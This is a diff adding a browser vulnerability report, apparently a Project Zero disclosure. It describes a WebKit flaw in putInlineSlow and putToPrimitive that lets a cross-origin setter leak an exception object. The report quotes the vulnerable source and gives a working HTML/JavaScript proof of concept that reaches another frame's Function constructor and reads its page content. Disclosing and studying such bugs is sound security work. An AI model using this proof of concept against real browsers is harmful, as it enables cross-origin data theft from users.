@@ -1,0 +1,105 @@
+VULNERABILITY DETAILS
+```
+bool JSObject::putInlineSlow(ExecState* exec, PropertyName propertyName, JSValue value, PutPropertySlot& slot)
+{
+    ASSERT(!isThisValueAltered(slot, this));
+
+    VM& vm = exec->vm();
+    auto scope = DECLARE_THROW_SCOPE(vm);
+
+    JSObject* obj = this;
+    for (;;) {
+        unsigned attributes;
+        PropertyOffset offset = obj->structure(vm)->get(vm, propertyName, attributes); // ***1***
+        if (isValidOffset(offset)) {
+            if (attributes & PropertyAttribute::ReadOnly) {
+                ASSERT(this->prototypeChainMayInterceptStoreTo(vm, propertyName) || obj == this);
+                return typeError(exec, scope, slot.isStrictMode(), ReadonlyPropertyWriteError);
+            }
+
+            JSValue gs = obj->getDirect(offset);
+            if (gs.isGetterSetter()) {
+                // We need to make sure that we decide to cache this property before we potentially execute aribitrary JS.
+                if (!structure(vm)->isDictionary())
+                    slot.setCacheableSetter(obj, offset);
+
+                bool result = callSetter(exec, slot.thisValue(), gs, value, slot.isStrictMode() ? StrictMode : NotStrictMode); // ***2***
+                RETURN_IF_EXCEPTION(scope, false);
+                return result;
+            }
+            if (gs.isCustomGetterSetter()) {
+                // We need to make sure that we decide to cache this property before we potentially execute aribitrary JS.
+                if (attributes & PropertyAttribute::CustomAccessor)
+                    slot.setCustomAccessor(obj, jsCast<CustomGetterSetter*>(gs.asCell())->setter());
+                else
+                    slot.setCustomValue(obj, jsCast<CustomGetterSetter*>(gs.asCell())->setter());
+
+                bool result = callCustomSetter(exec, gs, attributes & PropertyAttribute::CustomAccessor, obj, slot.thisValue(), value);
+                RETURN_IF_EXCEPTION(scope, false);
+                return result;
+            }
+            ASSERT(!(attributes & PropertyAttribute::Accessor));
+
+            // If there's an existing property on the object or one of its 
+            // prototypes it should be replaced, so break here.
+            break;
+        }
+[...]
+        JSValue prototype = obj->getPrototype(vm, exec);
+        RETURN_IF_EXCEPTION(scope, false);
+        if (prototype.isNull())
+            break;
+        obj = asObject(prototype);
+    }
+```
+
+This is an extension of https://bugs.chromium.org/p/project-zero/issues/detail?id=1240.
+`putInlineSlow` and `putToPrimitive` now call the access-checked `getPrototype` method instead of
+`getPrototypeDirect`. However, they still use `Structure::get` directly[1], which bypasses access
+checks implemented in functions that override `JSObject::put`. Thus, an attacker can put a
+cross-origin object into the prototype chain of a regular object and trigger the invocation of a
+cross-origin setter. If the setter raises an exception while processing the passed value, it's
+possible to leak the exception object and gain access to, e.g., another window's function
+constructor.
+
+Since this issue is only exploitable when a victim page defines a custom accessor property on the
+`location` object, its practical impact is minimal.
+
+
+VERSION
+WebKit revision 247430 
+Safari version 12.1.1 (14607.2.6.1.1)
+
+
+REPRODUCTION CASE
+<body>
+<script>
+frame = document.body.appendChild(document.createElement('iframe'));
+frame.src = `data:text/html,
+  <h1>secret data</h1>
+  <script>
+    location.__defineSetter__('foo', function(value) {
+      alert('Received value: ' + value);
+    });
+  </s` + `cript>`;
+
+function turnLeakedExceptionIntoUXSS(object) {
+  try {
+    object.foo = {toString: function() { return {} } };
+  } catch (e) {
+    let func = e.constructor.constructor;
+    func('alert(document.body.innerHTML)')();
+  }
+}
+
+frame.onload = () => {
+  // putInlineSlow
+  turnLeakedExceptionIntoUXSS({__proto__: frame.contentWindow.location});
+
+  // putToPrimitive
+  num = 1337;
+  num.__proto__.__proto__ = frame.contentWindow.location;
+  turnLeakedExceptionIntoUXSS(num);
+}
+</script>
+</body>
